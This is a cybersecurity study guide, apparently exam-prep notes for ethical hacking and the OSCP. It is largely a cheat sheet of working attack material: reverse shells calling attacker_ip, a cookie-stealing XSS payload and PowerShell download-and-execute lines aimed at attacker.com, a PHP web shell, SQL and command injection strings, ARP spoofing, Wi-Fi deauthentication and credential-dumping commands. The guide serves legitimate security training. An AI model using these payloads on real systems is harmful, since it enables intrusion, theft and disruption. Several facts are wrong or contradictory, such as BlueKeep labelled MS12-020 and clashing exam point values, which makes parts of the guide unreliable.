# Cybersecurity Comprehensive Cliff Notes
## Compiled Study Guide from Professional Resource Library

---

## Table of Contents
1. [Ethical Hacking Fundamentals](#ethical-hacking-fundamentals)
2. [Reconnaissance & Information Gathering](#reconnaissance--information-gathering)
3. [Network Security & Exploitation](#network-security--exploitation)
4. [Web Application Security](#web-application-security)
5. [System Hacking & Post-Exploitation](#system-hacking--post-exploitation)
6. [Metasploit Framework](#metasploit-framework)
7. [Wireless Network Security](#wireless-network-security)
8. [Social Engineering](#social-engineering)
9. [Cryptography Essentials](#cryptography-essentials)
10. [Digital Forensics](#digital-forensics)
11. [Penetration Testing Methodology](#penetration-testing-methodology)
12. [OSCP Preparation](#oscp-preparation)

---

## Ethical Hacking Fundamentals

### Core Concepts
- **Definition**: Authorized attempt to gain unauthorized access to systems, applications, or data
- **Purpose**: Identify vulnerabilities before malicious actors exploit them
- **Legal Framework**: Always obtain written authorization before testing

### Types of Hackers
- **White Hat**: Ethical hackers working with authorization
- **Black Hat**: Malicious hackers breaking laws
- **Gray Hat**: Operate in between, sometimes without authorization but without malicious intent

### Ethical Hacking Phases
1. **Reconnaissance**: Information gathering
2. **Scanning**: Identifying live systems and open ports
3. **Gaining Access**: Exploiting vulnerabilities
4. **Maintaining Access**: Persistence mechanisms
5. **Covering Tracks**: Log manipulation and evidence removal

### Key Principles
- **Confidentiality**: Information accessible only to authorized parties
- **Integrity**: Data remains unaltered
- **Availability**: Systems remain accessible when needed
- **Non-Repudiation**: Actions cannot be denied

---

## Reconnaissance & Information Gathering

### Passive Reconnaissance
**Goal**: Gather information without directly interacting with target

#### OSINT (Open Source Intelligence)
- **Search Engines**: Google dorking, Bing, DuckDuckGo
- **Social Media**: LinkedIn, Twitter, Facebook for employee info
- **Public Records**: WHOIS, DNS records, company registrations
- **Website Analysis**: Archive.org, built-with tools

#### Key Tools
- **theHarvester**: Email, subdomain, and name discovery
- **Maltego**: Link analysis and data mining
- **Shodan**: Internet of Things search engine
- **Recon-ng**: Web reconnaissance framework
- **SpiderFoot**: Automated OSINT gathering

#### Google Dorking Examples
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:txt
```

### Active Reconnaissance
**Goal**: Direct interaction to gather information

#### DNS Enumeration
```bash
# Zone Transfer
dig axfr @nameserver domain.com
host -t ns domain.com

# Subdomain discovery
dnsrecon -d domain.com
dnsenum domain.com
```

#### Network Scanning
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p- -T4 target.com
nmap -sV -O target.com
```

---

## Network Security & Exploitation

### Port Scanning Techniques

#### TCP Scanning
- **SYN Scan (-sS)**: Stealthy, doesn't complete handshake
- **Connect Scan (-sT)**: Full TCP connection
- **ACK Scan (-sA)**: Firewall detection
- **FIN Scan (-sF)**: Evades some firewalls

#### UDP Scanning
```bash
nmap -sU -p 53,161,500 target.com
```

#### Nmap NSE Scripts
```bash
# Vulnerability scanning
nmap --script vuln target.com

# Service enumeration
nmap --script=banner target.com
nmap --script=smb-enum-shares target.com
```

### Network Protocols & Vulnerabilities

#### SMB/NetBIOS (Ports 139, 445)
```bash
# Enumeration
enum4linux -a target.com
smbclient -L //target.com
nbtscan 192.168.1.0/24

# Exploitation (EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
```

#### FTP (Port 21)
```bash
# Anonymous login check
ftp target.com
# Username: anonymous

# Banner grabbing
nc target.com 21
telnet target.com 21
```

#### SSH (Port 22)
```bash
# Version detection
nc target.com 22

# Brute force (use responsibly)
hydra -l user -P wordlist.txt ssh://target.com
```

#### HTTP/HTTPS (Ports 80, 443)
```bash
# Directory enumeration
dirb http://target.com
gobuster dir -u http://target.com -w wordlist.txt
feroxbuster -u http://target.com
```

### ARP Poisoning & MITM Attacks
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing
arpspoof -i eth0 -t victim_ip gateway_ip
arpspoof -i eth0 -t gateway_ip victim_ip

# Using ettercap
ettercap -T -M arp:remote /gateway_ip// /victim_ip//
```

---

## Web Application Security

### OWASP Top 10 (Latest)

#### 1. Broken Access Control
- **Description**: Users can act outside intended permissions
- **Examples**: URL manipulation, privilege escalation
- **Testing**:
```bash
# Directory traversal
http://target.com/file?path=../../../../etc/passwd

# IDOR (Insecure Direct Object Reference)
http://target.com/user?id=123 (try id=124,125,etc)
```

#### 2. Cryptographic Failures
- **Description**: Weak encryption, plaintext storage
- **Testing**: Check for SSL/TLS vulnerabilities
```bash
sslscan target.com
testssl target.com
```

#### 3. Injection Attacks

**SQL Injection**
```sql
-- Authentication bypass
' OR '1'='1
admin'--
admin' #

-- Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--

-- Error-based
' AND 1=CONVERT(int,(SELECT @@version))--

-- Blind SQL injection
' AND 1=1--  (True)
' AND 1=2--  (False)
```

**SQLMap Tool**
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
```

**Command Injection**
```bash
; ls -la
| whoami
& ping -c 4 attacker.com
`cat /etc/passwd`
$(whoami)
```

**LDAP Injection**
```
*)(uid=*))(|(uid=*
admin*)(&(password=*)
```

#### 4. Insecure Design
- Design flaws in architecture
- Missing security controls
- Threat modeling failures

#### 5. Security Misconfiguration
```bash
# Common misconfigurations
- Default credentials
- Unnecessary features enabled
- Detailed error messages
- Missing security headers

# Testing
curl -I http://target.com
nikto -h target.com
```

#### 6. Vulnerable Components
```bash
# Identify components
whatweb target.com
wappalyzer (browser extension)

# Check for known vulnerabilities
searchsploit application_name
```

#### 7. Authentication Failures
```bash
# Brute force
hydra -l admin -P wordlist.txt target.com http-post-form

# Session attacks
- Session fixation
- Weak session IDs
- Missing session timeout
```

#### 8. Data Integrity Failures
- Insecure deserialization
- Unsigned/unverified updates
- CI/CD pipeline compromises

#### 9. Logging Failures
- Insufficient logging
- Log injection attacks
- Logs not monitored

#### 10. Server-Side Request Forgery (SSRF)
```bash
# Testing SSRF
http://target.com/fetch?url=http://localhost
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=file:///etc/passwd
```

### Cross-Site Scripting (XSS)

#### Reflected XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

#### Stored XSS
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

#### DOM-based XSS
```javascript
<script>
var pos=document.URL.indexOf("name=")+5;
document.write(document.URL.substring(pos,document.URL.length));
</script>
```

#### XSS Payload Obfuscation
```html
<IMG SRC=javascript:alert('XSS')>
<BODY ONLOAD=alert('XSS')>
<iframe src=javascript:alert('XSS')>
```

### Cross-Site Request Forgery (CSRF)
```html
<img src="http://bank.com/transfer?amount=1000&to=attacker" style="display:none">

<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

### File Upload Vulnerabilities
```php
# PHP reverse shell
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'"); ?>

# Upload bypasses
- Double extensions: shell.php.jpg
- Null byte: shell.php%00.jpg
- MIME type manipulation
- Magic number modification
```

---

## System Hacking & Post-Exploitation

### Password Cracking

#### Hash Identification
```bash
hash-identifier
hashid hash_value
```

#### John the Ripper
```bash
# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt
john --show hashes.txt

# Generate wordlist
john --wordlist=words.txt --rules --stdout > mutated.txt
```

#### Hashcat
```bash
# MD5
hashcat -m 0 -a 0 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 -a 0 hash.txt wordlist.txt

# Brute force
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a
```

#### Hydra (Online Attacks)
```bash
# SSH
hydra -l username -P wordlist.txt ssh://target.com

# FTP
hydra -l admin -P wordlist.txt ftp://target.com

# HTTP POST
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P wordlist.txt rdp://target.com
```

### Windows Exploitation

#### Common Vulnerabilities
- **MS17-010 (EternalBlue)**: SMB vulnerability
- **MS08-067**: Windows Server Service vulnerability
- **MS14-058**: TrackPopupMenu vulnerability

#### Windows Privilege Escalation
```batch
# System information
systeminfo
hostname
whoami /all

# User enumeration
net user
net localgroup administrators
net user /domain

# Network information
ipconfig /all
route print
arp -a
netstat -ano

# Running processes
tasklist /svc
wmic process list brief

# Scheduled tasks
schtasks /query /fo LIST /v

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Writable services
accesschk.exe -uwcqv "Authenticated Users" *

# Registry auto-runs
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

#### PowerShell Commands
```powershell
# Execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Get system info
Get-ComputerInfo
Get-WmiObject -Class Win32_OperatingSystem

# Find files
Get-ChildItem -Path C:\ -Include *.txt,*.pdf -Recurse -ErrorAction SilentlyContinue

# Download file
Invoke-WebRequest -Uri http://attacker.com/file.exe -OutFile file.exe
```

### Linux Exploitation

#### Linux Privilege Escalation
```bash
# System enumeration
uname -a
cat /etc/issue
cat /etc/*-release
hostname

# User information
id
whoami
who
w
last
cat /etc/passwd
cat /etc/shadow

# Sudo privileges
sudo -l

# SUID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# World-writable scripts in PATH
echo $PATH
find / -type f -writable 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Kernel exploits
searchsploit linux kernel version
```

#### GTFOBins Exploitation
- Sudo commands that can be exploited
- SUID binaries for privilege escalation
- Capabilities abuse

Examples:
```bash
# vim
sudo vim -c ':!/bin/sh'

# find
sudo find / -exec /bin/sh \; -quit

# nmap (older versions)
echo "os.execute('/bin/sh')" > shell.nse
sudo nmap --script=shell.nse

# python
sudo python -c 'import os; os.system("/bin/sh")'
```

### Reverse Shells

#### Netcat Listeners
```bash
# Attacker machine
nc -lvnp 4444
nc -lvnp 4444 -e /bin/bash  # Windows

# Victim machine (Linux)
nc attacker_ip 4444 -e /bin/bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Victim machine (Windows)
nc attacker_ip 4444 -e cmd.exe
```

#### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
0<&196;exec 196<>/dev/tcp/attacker_ip/4444; sh <&196 >&196 2>&196
```

#### Python Reverse Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP Reverse Shell
```php
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### PowerShell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("attacker_ip",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Upgrading Shells
```bash
# Python TTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# CTRL+Z (background shell)
stty raw -echo; fg
# Then press Enter twice

# Set terminal
export TERM=xterm
export SHELL=bash

# Alternative methods
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
```

---

## Metasploit Framework

### Basic Commands
```bash
# Start Metasploit
msfconsole

# Update
msfupdate

# Search
search type:exploit platform:windows
search cve:2017 type:exploit

# Module info
info exploit/windows/smb/ms17_010_eternalblue

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS target_ip
set RHOST target_ip
set LHOST attacker_ip
set LPORT 4444
set payload windows/meterpreter/reverse_tcp

# Run exploit
exploit
run

# Background session
background
CTRL+Z

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

### Common Exploits
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# BlueKeep (MS12-020)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload

# Jenkins Script Console
use exploit/multi/http/jenkins_script_console

# Apache Struts
use exploit/multi/http/struts2_content_type_ognl
```

### Meterpreter Commands
```bash
# System
sysinfo
getuid
getpid
ps

# User
getuid
getsystem  # Privilege escalation
hashdump   # Dump password hashes

# File system
pwd
ls
cd
cat file.txt
download file.txt
upload malware.exe
search -f *.txt

# Network
ipconfig
route
arp
netstat

# Process
ps
getpid
migrate PID
kill PID

# Screenshot & webcam
screenshot
webcam_snap
webcam_stream

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Persistence
run persistence -X -i 10 -p 4444 -r attacker_ip

# Pivoting
run autoroute -s 10.10.10.0/24
portfwd add -l 3389 -p 3389 -r target_ip

# Shell
shell  # Drop to system shell
```

### Post-Exploitation Modules
```bash
# Credential harvesting
use post/windows/gather/credentials/credential_collector
use post/windows/gather/enum_chrome

# Network enumeration
use post/windows/gather/arp_scanner
use post/windows/gather/enum_shares

# Privilege escalation
use post/multi/recon/local_exploit_suggester
use post/windows/gather/enum_patches

# Lateral movement
use exploit/windows/smb/psexec
use exploit/windows/smb/psexec_psh
```

### Auxiliary Modules
```bash
# Scanners
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/ssh/ssh_login

# Sniffers
use auxiliary/sniffer/psnuffle

# Denial of Service
use auxiliary/dos/tcp/synflood

# Fuzzing
use auxiliary/fuzzers/http/http_form_field
```

---

## Wireless Network Security

### Wi-Fi Protocols
- **WEP**: Deprecated, easily crackable
- **WPA**: Better than WEP, still vulnerable
- **WPA2**: Current standard, vulnerable to KRACK
- **WPA3**: Latest, most secure

### Wireless Reconnaissance
```bash
# Put interface in monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c channel --bssid AP_MAC -w capture wlan0mon

# Deauthentication attack (force handshake)
aireplay-ng --deauth 10 -a AP_MAC wlan0mon
```

### WPA/WPA2 Cracking
```bash
# Crack handshake
aircrack-ng -w wordlist.txt -b AP_MAC capture.cap

# Using Hashcat
cap2hccapx capture.cap output.hccapx
hashcat -m 2500 output.hccapx wordlist.txt
```

### Evil Twin Attack
```bash
# Create rogue AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# DHCP server
dhcpd -cf /etc/dhcp/dhcpd.conf

# DNS spoofing
dnsspoof -i at0

# SSL strip
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

### Wi-Fi Protected Setup (WPS) Attacks
```bash
# Scan for WPS-enabled APs
wash -i wlan0mon

# Pixie Dust attack
reaver -i wlan0mon -b AP_MAC -c channel -K

# Brute force PIN
reaver -i wlan0mon -b AP_MAC -c channel -vv
```

### Bluetooth Hacking
```bash
# Scan for devices
hcitool scan
bluetoothctl scan on

# Device info
hcitool info MAC_ADDRESS

# L2ping DoS
l2ping -i hci0 -s 600 -f MAC_ADDRESS
```

---

## Social Engineering

### Phishing Techniques

#### Email Phishing
- **Spear Phishing**: Targeted at specific individuals
- **Whaling**: Targeting high-profile executives
- **Clone Phishing**: Legitimate email replicated with malicious link

#### Phishing Tools
```bash
# SET (Social Engineering Toolkit)
setoolkit

# Gophish
gophish

# King Phisher
king-phisher
```

### Pretexting
- Creating fabricated scenario
- Building trust with target
- Extracting sensitive information

### Baiting
- Offering something enticing
- Infected USB drives
- Free software downloads

### Tailgating/Piggybacking
- Following authorized person through secure entry
- Social manipulation
- Physical security bypass

### Phone-Based Attacks (Vishing)
- Voice phishing
- Caller ID spoofing
- Impersonation

### SMS Phishing (Smishing)
- Text message attacks
- Malicious links
- Urgent requests

### Defense Against Social Engineering
1. **Awareness Training**: Regular security education
2. **Verification**: Always verify unusual requests
3. **Policies**: Clear security policies and procedures
4. **Technical Controls**: Email filtering, multi-factor authentication
5. **Reporting**: Encourage reporting of suspicious activity

---

## Cryptography Essentials

### Encryption Types

#### Symmetric Encryption
- Same key for encryption and decryption
- **Algorithms**: AES, DES, 3DES, Blowfish, RC4
- **Pros**: Fast, efficient for large data
- **Cons**: Key distribution problem

#### Asymmetric Encryption
- Public and private key pair
- **Algorithms**: RSA, ECC, ElGamal, DSA
- **Pros**: Secure key exchange
- **Cons**: Slower than symmetric

### Hash Functions
- One-way functions
- Fixed-length output
- **Algorithms**: MD5, SHA-1, SHA-256, SHA-512, NTLM

#### Hash Characteristics
- **Deterministic**: Same input = same output
- **Collision Resistant**: Hard to find two inputs with same hash
- **Pre-image Resistant**: Can't derive input from hash
- **Avalanche Effect**: Small input change drastically changes hash

### Digital Signatures
```
Message → Hash → Encrypt with Private Key → Digital Signature
Verify → Decrypt with Public Key → Compare Hashes
```

### SSL/TLS
- **SSL**: Secure Sockets Layer (deprecated)
- **TLS**: Transport Layer Security (current standard)
- Versions: TLS 1.0, 1.1 (deprecated), 1.2, 1.3 (recommended)

#### SSL/TLS Testing
```bash
# Test SSL/TLS
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers target.com
```

### PKI (Public Key Infrastructure)
- **Certificate Authority (CA)**: Issues certificates
- **Registration Authority (RA)**: Verifies certificate requests
- **Certificate Revocation List (CRL)**: List of revoked certificates
- **OCSP**: Online Certificate Status Protocol

### Steganography
- Hiding data within other data
- **Tools**: steghide, OpenStego, SteganoShark

```bash
# Hide data
steghide embed -cf image.jpg -ef secret.txt

# Extract data
steghide extract -sf image.jpg
```

---

## Digital Forensics

### Digital Forensics Principles
1. **Minimize Data Loss**: Preserve original evidence
2. **Record Everything**: Document all actions
3. **Analyze Without Modification**: Use write blockers
4. **Report Findings**: Comprehensive documentation
5. **Chain of Custody**: Maintain evidence integrity

### Types of Forensics
- **Computer Forensics**: PCs, laptops, servers
- **Mobile Forensics**: Smartphones, tablets
- **Network Forensics**: Traffic analysis, intrusion detection
- **Memory Forensics**: RAM analysis
- **Cloud Forensics**: Cloud infrastructure and services

### Forensics Process

#### 1. Identification
- Identify digital evidence
- Determine scope
- Legal considerations

#### 2. Preservation
```bash
# Create forensic image
dd if=/dev/sda of=image.dd bs=4M
dcfldd if=/dev/sda of=image.dd hash=md5 hashlog=hash.txt

# Verify integrity
md5sum image.dd
sha256sum image.dd
```

#### 3. Collection
- Acquire volatile data first (RAM, running processes)
- Then non-volatile data (hard drives, USB)
- Use write blockers

#### 4. Analysis
```bash
# File system analysis
autopsy
sleuthkit

# Memory analysis
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 netscan

# Log analysis
grep -r "pattern" /var/log/
```

#### 5. Documentation
- Timeline creation
- Chain of custody forms
- Detailed reports
- Screenshots and evidence photos

#### 6. Presentation
- Clear, non-technical language
- Visual aids
- Expert testimony preparation

### Forensics Tools
```bash
# Disk imaging
dd, dcfldd, FTK Imager

# Analysis
Autopsy, EnCase, FTK, X-Ways

# Memory forensics
Volatility, Rekall

# Network forensics
Wireshark, NetworkMiner, tcpdump

# Mobile forensics
Cellebrite, Oxygen Forensics
```

### Incident Response
```bash
# Volatile data collection order
1. Network connections: netstat -ano
2. Logged-in users: who, w
3. Running processes: ps aux, tasklist
4. Open files: lsof
5. System information: systeminfo, uname -a
6. Memory dump: FTK Imager, winpmem
7. Disk image: dd, dcfldd
```

### Anti-Forensics Techniques (Be Aware Of)
- **Data Wiping**: Secure deletion tools
- **Encryption**: Full disk encryption
- **Steganography**: Hiding data
- **Log Manipulation**: Clearing or modifying logs
- **Timestamp Manipulation**: Changing file times
- **Obfuscation**: Making analysis difficult

---

## Penetration Testing Methodology

### Planning & Scoping
1. **Define Objectives**: What are we testing?
2. **Scope**: IP ranges, domains, systems in/out of scope
3. **Rules of Engagement**: Testing windows, contacts, constraints
4. **Legal Documentation**: Contracts, authorization letters, NDAs

### Information Gathering (Reconnaissance)
- Passive reconnaissance
- Active reconnaissance
- OSINT gathering
- Social media profiling
- DNS enumeration
- Subdomain discovery

### Threat Modeling
- Identify assets
- Determine threats
- Assess vulnerabilities
- Prioritize risks

### Vulnerability Analysis
```bash
# Automated scanners
nessus
openvas
nexpose

# Manual testing
nmap scripts
custom checks
configuration review
```

### Exploitation
- Verify vulnerabilities
- Gain initial access
- Exploit carefully (avoid damage)
- Document all exploits

### Post-Exploitation
- Privilege escalation
- Lateral movement
- Data exfiltration simulation
- Persistence establishment
- Covering tracks (document, don't actually do)

### Reporting
#### Executive Summary
- High-level overview
- Business impact
- Key recommendations
- Risk ratings

#### Technical Details
- Vulnerability details
- Exploitation steps
- Screenshots/evidence
- Remediation steps
- CVSS scores

#### Appendices
- Detailed findings
- Tool outputs
- Raw data
- Methodology

### Report Sections
1. **Introduction**: Scope, methodology, limitations
2. **Executive Summary**: High-level findings
3. **Technical Findings**: Detailed vulnerabilities
4. **Risk Assessment**: Severity ratings
5. **Recommendations**: Prioritized remediation steps
6. **Conclusion**: Summary and next steps

### Severity Ratings
- **Critical**: Immediate threat, easy to exploit
- **High**: Significant risk, moderate difficulty
- **Medium**: Moderate risk, some skill required
- **Low**: Minimal risk, difficult to exploit
- **Informational**: No immediate risk, best practices

---

## OSCP Preparation

### Exam Overview
- **Duration**: 23 hours 45 minutes
- **Format**: 5 machines to compromise
- **Passing**: 70 points minimum
- **Report**: 24 hours after exam ends

### Point Distribution
- **10 points**: Buffer overflow machine
- **25 points**: Two machines (usually)
- **20 points**: Two machines (usually)
- **Total**: 100 points possible

### Key Skills Required

#### Enumeration
- Port scanning (Nmap)
- Web enumeration (Gobuster, Nikto)
- Service enumeration (SMB, FTP, etc.)
- Always enumerate thoroughly

#### Exploitation
- Web application vulnerabilities
- Buffer overflow (mandatory 25 points)
- Privilege escalation (Windows & Linux)
- Password attacks

#### Buffer Overflow
```python
# Basic structure
1. Fuzzing - crash the application
2. Control EIP - find offset
3. Bad characters - identify
4. Find JMP ESP - use mona.py
5. Generate shellcode - msfvenom
6. Exploit - execute payload
```

#### Privilege Escalation
```bash
# Linux
- SUID binaries
- Sudo misconfigurations
- Kernel exploits
- Cron jobs
- PATH hijacking

# Windows
- Unquoted service paths
- Weak file permissions
- AlwaysInstallElevated
- Stored credentials
- Token impersonation
```

### Study Resources
1. **PWK Course Material**: Primary resource
2. **TJ Null's OSCP List**: Practice boxes on HTB/VulnHub
3. **IppSec Videos**: Walkthroughs and techniques
4. **Forums**: Reddit r/oscp, OSCP Discord

### Practice Platforms
- **HackTheBox**: Similar to OSCP machines
- **VulnHub**: Free vulnerable VMs
- **Proving Grounds**: OffSec's practice platform
- **TryHackMe**: Guided learning paths

### Exam Tips
1. **Read Carefully**: Follow all exam restrictions
2. **Document Everything**: Screenshots, commands, timestamps
3. **Time Management**: Don't get stuck on one machine
4. **Buffer Overflow First**: Easy 25 points
5. **Try Harder**: Enumerate more when stuck
6. **Take Breaks**: Stay fresh and focused
7. **Report Quality**: Clear, professional documentation

### Reporting Requirements
- Screenshots with IP addresses and timestamps
- Step-by-step exploitation process
- Proof.txt contents (screenshots)
- Code snippets used
- Professional formatting

### Common Mistakes to Avoid
- **Insufficient enumeration**: Always enumerate more
- **Rabbit holes**: Know when to move on
- **Poor documentation**: Screenshot everything
- **Time mismanagement**: Budget time wisely
- **Not reading restrictions**: Follow all rules
- **Skipping buffer overflow**: Free 25 points

---

## Quick Reference Commands

### Network Scanning
```bash
nmap -sC -sV -oA scan target.com
nmap -p- -T4 target.com
nmap --script vuln target.com
```

### Web Enumeration
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt
nikto -h http://target.com
```

### SMB Enumeration
```bash
enum4linux -a target.com
smbclient -L //target.com
smbmap -H target.com
```

### File Transfers
```bash
# HTTP Server (Python)
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

# Download (Windows)
certutil -urlcache -f http://attacker/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/file.exe','file.exe')"

# Download (Linux)
wget http://attacker/file
curl http://attacker/file -o file
```

### Shells
```bash
# Listener
nc -lvnp 4444
rlwrap nc -lvnp 4444

# Reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
nc attacker_ip 4444 -e /bin/bash
```

### Privilege Escalation
```bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null
LinPEAS.sh

# Windows
whoami /priv
icacls "path"
winPEAS.exe
```

---

## Conclusion

This comprehensive guide covers the essential topics in cybersecurity and penetration testing. Remember:

1. **Always Have Authorization**: Never test without explicit written permission
2. **Document Everything**: Thorough documentation is crucial
3. **Continuous Learning**: Stay updated with latest vulnerabilities and techniques
4. **Practice Legally**: Use authorized platforms like HTB, TryHackMe, OSCP labs
5. **Ethical Responsibility**: Use skills to protect, not harm

### Next Steps
- Set up your own lab environment
- Practice on CTF platforms
- Join cybersecurity communities
- Pursue certifications (OSCP, CEH, Security+)
- Stay current with security news and advisories

### Resources
- **OWASP**: https://owasp.org
- **MITRE ATT&CK**: https://attack.mitre.org
- **HackTricks**: https://book.hacktricks.xyz
- **PayloadsAllTheThings**: GitHub repository
- **GTFOBins**: https://gtfobins.github.io
- **LOLBAS**: Living Off The Land Binaries and Scripts

---

*Remember: With great power comes great responsibility. Always use these skills ethically and legally.*
